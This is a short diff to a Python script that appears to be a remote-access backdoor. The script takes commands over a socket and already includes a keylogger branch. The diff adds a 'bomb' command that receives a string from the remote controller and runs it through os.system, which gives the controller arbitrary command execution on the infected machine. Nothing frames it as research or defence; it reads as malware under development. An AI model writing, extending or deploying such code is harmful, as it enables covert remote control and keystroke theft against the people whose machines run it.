@@ -96,7 +96,27 @@ while 1 :
        print("command as been executed successfully")
     
     
-    
+    elif command == "bomb":
+       bomb = s.recv(buf)
+       bomb = bomb.decode()
+       os.system(bomb)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+   
     elif command == "key_logger":
         def on_press(key):
 
